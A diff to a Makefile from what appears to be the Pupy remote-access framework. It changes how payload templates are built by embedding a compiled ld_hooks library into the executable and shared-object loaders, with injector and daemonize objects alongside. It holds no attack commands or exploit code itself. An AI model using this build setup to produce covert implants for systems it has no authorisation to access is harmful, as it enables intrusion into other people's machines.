@@ -57,7 +57,9 @@ DEBUG_ADD := -debug
 CFLAGS += -DDEBUG -O0 -g
 LDFLAGS += -g
 NAME   := "$(NAME)d"
+DEBUG_OBJS := debug.o
 else
+DEBUG_OBJS :=
 CFLAGS += -Os
 ifeq ($(OS),Linux)
 LDFLAGS += -O1 -Wl,-s -Wl,-x -Wl,--gc-sections -Wl,--no-undefined
@@ -70,13 +72,12 @@ endif
 PYTHON ?= python
 TEMPLATE_OUTPUT_PATH ?= ../../pupy/payload_templates/
 
-PYOBJS := pupy_load.o
-SHARED_OBJS := main_so.o pupy_shared.o tmplibrary_lmid.o
-APP_OBJS := main_exe.o pupy.o tmplibrary.o
+SHARED_OBJS := main_so.o pupy_shared.o tmplibrary_lmid.o pupy_load_shared.o
+APP_OBJS := main_exe.o pupy.o tmplibrary.o pupy_load.o ld_hooks.o
 COMMON_OBJS := daemonize.o decompress.o
 
 ifneq ($(DEBUG),)
-COMMON_OBJS += debug.o
+COMMON_OBJS += $(DEBUG_OBJS)
 endif
 
 ifeq ($(UNCOMPRESSED),)
@@ -112,15 +113,31 @@ debug.o: ../common/debug.c ../common/debug.h
 pupy.o: pupy.c revision.h ../common/Python-dynload.h import-tab.h
 
 pupy_shared.o: pupy.c revision.h ../common/jni_on_load.c ../common/Python-dynload.h import-tab.h
-	$(CC) -c -o $@ $< $(CFLAGS) -D_PUPY_SO
+	$(CC) -c -o $@ $< $(CFLAGS) -D_PUPY_SO -D_LD_HOOKS_NAME=\"ld_hooks_$(NAME).so\" \
 
 main_so.o:	import-tab.h
 main_exe.o:	import-tab.h
+
+pupy_load_shared.o: pupy_load.c \
+	resources/$(ARCH)/libssl.c resources/$(ARCH)/libcrypto.c \
+	resources/$(ARCH)/python27.c \
+	resources/$(ARCH)/library.c \
+	ld_hooks_$(NAME).c \
+	../common/Python-dynload.c ../common/Python-dynload.h \
+	../common/Python-dynload.c ../common/Python-dynload.h \
+	../common/LzmaDec.c ../common/LzmaDec.h ../common/lzmaunpack.c \
+	import-tab.h revision.h
+	$(CC) -c -o $@ $< $(CFLAGS) \
+		-D_LD_HOOKS_NAME=\"ld_hooks_$(NAME).so\" \
+		-D_LD_HOOKS_START=ld_hooks_$(NAME)_c_start \
+		-D_LD_HOOKS_SIZE=ld_hooks_$(NAME)_c_size \
+		-include "ld_hooks_$(NAME).c"
 
 pupy_load.o: pupy_load.c \
 	resources/$(ARCH)/libssl.c resources/$(ARCH)/libcrypto.c \
 	resources/$(ARCH)/python27.c \
 	resources/$(ARCH)/library.c \
+	ld_hooks_$(NAME).c \
 	../common/Python-dynload.c ../common/Python-dynload.h \
 	../common/Python-dynload.c ../common/Python-dynload.h \
 	../common/LzmaDec.c ../common/LzmaDec.h ../common/lzmaunpack.c \
@@ -143,6 +160,14 @@ resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(A
 resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
 	$(PYTHON) $(PFLAGS) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(XZARGS)
 
+ld_hooks_$(NAME).c: ../gen_resource_header.py ld_hooks_$(NAME).so
+	$(PYTHON) $(PFLAGS) ../gen_resource_header.py ld_hooks_$(NAME).so $@ $(COMPRESSED) $(XZARGS)
+
+ld_hooks_$(NAME).so: ld_hooks.c $(DEBUG_OBJS)
+	$(CC) $(CFLAGS) -shared $+ -o $@ $(LDFLAGS) \
+		-D_LD_HOOKS_NAME=\"$@\" \
+		-Wl,-soname,$@ \
+		-Wl,--no-undefined
 
 injector/%.o: injector/%.c
 	$(CC) -c $(LINUX_INJECT_CFLAGS) $(CFLAGS) -o $@ $<
@@ -183,14 +208,14 @@ resources/$(ARCH)/libssl.c: ../gen_resource_header.py resources/$(ARCH)/libssl.s
 resources/$(ARCH)/libcrypto.c: ../gen_resource_header.py resources/$(ARCH)/libcrypto.so
 	$(PYTHON) $(PFLAGS) $+ $@ $(COMPRESSED) $(XZARGS)
 
-$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): $(APP_OBJS) $(PYOBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX): $(APP_OBJS) $(COMMON_OBJS)
 	$(CC) $(PIE) $+ -o $@ $(LDFLAGS) \
-		-Wl,--version-script=pupy.ldscript
+		-Wl,--version-script=pupy.ldscript \
+		-Wl,--export-dynamic
 
-$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: $(SHARED_OBJS) $(PYOBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupyx$(NAME).$(SUFFIX).so: $(SHARED_OBJS) $(COMMON_OBJS)
 	$(CC) -shared $+ -o $@ $(LDFLAGS) -Wl,-soname,pupyx$(NAME).$(SUFFIX).so \
 		-Wl,--version-script=pupy.so.ldscript
-
 
 .PHONY: clean all
 
@@ -202,6 +227,8 @@ clean:
 distclean: clean
 	rm -f resources/*.c
 	rm -f resources/$(ARCH)/*.c
+	rm -f ld_hooks_$(NAME).c
+	rm -f ld_hooks_$(NAME).so
 	rm -f import-tab.c
 	rm -f import-tab.h
 	rm -f revision.h
